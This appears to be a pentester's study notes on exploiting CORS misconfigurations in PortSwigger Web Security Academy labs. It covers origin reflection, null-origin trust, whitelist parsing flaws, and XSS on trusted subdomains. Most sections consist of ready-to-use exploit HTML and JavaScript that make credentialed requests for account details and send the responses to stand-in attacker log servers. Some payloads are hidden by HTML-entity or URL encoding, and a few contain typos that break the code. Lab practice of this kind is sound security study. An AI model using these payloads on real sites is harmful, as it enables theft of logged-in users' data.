![[CORS.webp]]
# Recon

CORS enables controlled access to resources outside a provided domain. If poorly configured, it can provide potential for cross-domain attacks.

Same-Origin Policy (SOP) limits the ability for a site to interact with resources outside of source domain. Generally allows a domain to issue requests to other domains, but not to access responses. SOP is restrictive and many sites interact with subdomains or third-party sites that require full cross-origin access.

Controlled relaxation of SOP is possible via CORS which uses a suite of HTTP headers that define trusted web origins and properties like whether authenticated access is permitted. Normally combined in a header exchange between browser and cross-origin site trying to be accessed.

Analyse all application responses to identify if any explicitly support CORS - e.g. `Access-Control-Allow-Origin: https://malicious-website.com`.

Identify what origins are allowed to submit CORS requests to the application by submitting the following:

```json
Origin: same-value
```

Identify if any requests can be used to send CORS request with credentials:

```json
Access-Control-Allow-Credentials: true
```
# Basic Origin Reflection

Always check for any requests for any of the specified headers. For example, account details may include the ACAC header, suggesting CORS in place. In that case, send an Origin header:

```json
Origin: https://attacker.com
```

The app may allow any Origin to submit a cross-origin request and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: attacker.com
```

With these headers in the response, an attacker can host malicious code in their server that will submit a request to the vulnerable app and direct the authenticated response back to their server. Now, the attacker needs to trick the victim user into visiting their website while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

Some payloads work, some don't:

```html
<html>
<script>
	var req - newXMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://VULNERABLE-APP.com/accountDetails',true)
	req.withCredentials = true;
	req.send();

	function reqListener() {
		loation = 'https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+this.responseText;
	};
</script>
</html>
```

```html
<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<REDACTED>.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>
```

```html
<html>
    <body data-rsssl=1>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://X.web-security-academy.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```
# Server-Generated ACAO Header

Some apps provide access to other domains and allow access from any other domains. One way is via reading the Origin header from requests and including a response header stating the requesting origin is allowed. For example:

```html
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It responds with:

```html
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Since the app reflects arbitrary origins, it means any domain can access resources from the vulnerable domain. If the response has sensitive info, you can extract it:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```
# Error Parsing Origin Headers

Some apps support using a whitelist. When a CORS request is received, the origin is compared to it. If it appears, then it is reflected in the ACAO header. For example:

```html
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

The app checks the supplied origin and if it is on the whitelist, it reflects it:

```html
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Some orgs allow access from all subdomains and some allow access from other orgs domains including their subdomains. Rules are often implemented by matching URL prefixes or suffixes or via regex. Suppose an app grants access to all domains ending in `normal-website.com`. 

An attacker can gain access by registering `hackernormal-website.com`. Or if an app supports all domains beginning with `normal-website.com` an attacker can register `normal-website.com.evil-user.net`.
# Trusted Null Origin

Origin header supports `null` value. Browsers can send null in various situations:

- Cross-origin redirects
- Requests from serialized data
- Request using the `file:` protocol
- Sandboxed cross-origin requests

The app may allow the "null" Origin to submit a cross-origin request and view the authenticated response.  Try submitting the following header:

```json
Origin: null
```

This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: null
```

With these headers in the response, an attacker can host malicious code in their server that will submit a request to the vulnerable app and direct the authenticated response back to their server. 

The malicious code will be within an \<iframe> that will cause the browser to set the Origin header to "null". The attacker now needs to trick the victim user into visiting their website while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

Some payloads work, some don't:

```html
<html>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
</html>
```

```html
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="Viewport" content="width=device-width", initial-scale="1.0">
        <title>Document</title>
    </head>
<body>
    <h1>Hello</h1>
    <iframe
sandbox="allow-forms allow-scripts allow-top-navigation"
srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x63;&#x6f;&#x6e;&#x73;&#x74;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x0a;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x67;&#x65;&#x74;&#x22;&#x2c;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x30;&#x61;&#x31;&#x66;&#x30;&#x30;&#x66;&#x37;&#x30;&#x33;&#x30;&#x61;&#x32;&#x32;&#x62;&#x65;&#x38;&#x35;&#x62;&#x66;&#x61;&#x66;&#x38;&#x39;&#x30;&#x30;&#x65;&#x62;&#x30;&#x30;&#x66;&#x33;&#x2e;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2d;&#x61;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x44;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;&#x22;&#x2c;&#x20;&#x74;&#x72;&#x75;&#x65;&#x29;&#x0a;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x28;&#x29;&#x3d;&#x3e;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x3d;&#x20;&#x22;&#x2f;&#x61;&#x62;&#x63;&#x3f;&#x6b;&#x65;&#x79;&#x3d;&#x22;&#x20;&#x2b;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x77;&#x69;&#x74;&#x68;&#x43;&#x72;&#x65;&#x64;&#x65;&#x6e;&#x74;&#x69;&#x61;&#x6c;&#x73;&#x3d;&#x74;&#x72;&#x75;&#x65;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x29;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;"
></iframe>
</body>
</html>
```

The HTML encoding section is as follows:

```html
<script>
    const request = new XMLHttpRequest()

    request.open("get", "https://0a1f00f7030a22be85bfaf8900eb00f3.web-security-academy.net/accountDetails", true)

    request.onload = ()=>{
        window.location.href= "/abc?key=" + request.responseText
    }

    request.withCredentials=true
    request.send()
</script>
```
# Exploiting CSS via CORS

If a site trusts an origin that is XSS vulnerable, an attacker can exploit it to inject JavaScript that uses CORS to extract sensitive information from the site that trusts it. For example:

```html
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If it responds with:

```html
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Then if it is vulnerable to XSS, it could be used to gather an API via:

```json
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```
# Breaking TLS

If an app that employs HTTPS also whitelists a trusted subdomain using HTTP, it can be exploited. For example:

```html
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The app responds with:

```html
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
# Subdomain Origin Allowed

The app is only allowing subdomains to send cross-origin requests and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: subdomain.vulnerable-app.com
```

If the subdomain contains an XSS vulnerability, you can inject a script that will submit a request to the main application and send the response to the attacker’s server. This will work since the subdomain is allowed to view the authenticated responses from the main application.

When the XSS script executes, the Origin header's value will be **subdomain.vulnerable-app.com** (reason why is because the XSS script is essentially a part of the application now). This allows the response to contain the authenticated data. The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

Make sure to encode the angle brackets \<> in the payload within the document.location to prevent breaking the payload. This payload is the exact same as the Basic Origin Reflection, except the payload is injected in the XSS vulnerable parameter of the Subdomain.

```html
<html>
<script>
    document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4%3cscript%3e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='%2bthis.responseText; };%3c/script%3e&storeId=1"
</script>
</html>
```

The decoded version being:

```html
<html>
<script>
   document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4
      <script> 
         var req = new XMLHttpRequest(); 
         req.onload = reqListener;
         req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); 
         req.withCredentials = true; 
         req.send();
         function reqListener() {
            location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='+this.responseText; 
      };</script>&storeId=1"
</script>
</html>
```

Another version is the following:

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <h1>Hello</h1>

        <script>
            window.location ="http://stock.ID.web-security-academy.net/?productId=&storeId=3"
        </script>
    </body>
</html>
```

With the following being URL encoded and put after the `productId=` parameter - where XSS is present:

```html
<script>
    const request = new XMLHttpRequest()

    request.open("get", "https://ID.web-security-academy.net/accountDetails", true)

    request.onload= ()=>{
        window.location = "https://exploit-ID.exploit-server.net/exploit?key=" + request.responseText
    }

    request.withCredentials = true
    request.send()
</script>
```

After URL encoding and combining with the main payload:

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        <h1>Hello</h1>

        <script>
            window.location ="http://stock.ID.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%63%6f%6e%73%74%20%72%65%71%75%65%73%74%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%6f%70%65%6e%28%22%67%65%74%22%2c%20%22%68%74%74%70%73%3a%2f%2f%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%20%74%72%75%65%29%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%6f%6e%6c%6f%61%64%3d%20%28%29%3d%3e%7b%0a%20%20%20%20%20%20%20%20%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%20%3d%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%49%44%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%22%20%2b%20%72%65%71%75%65%73%74%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%0a%20%20%20%20%7d%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%0a%20%20%20%20%72%65%71%75%65%73%74%2e%73%65%6e%64%28%29%0a%3c%2f%73%63%72%69%70%74%3e&storeId=3"
        </script>
    </body>
</html>
```

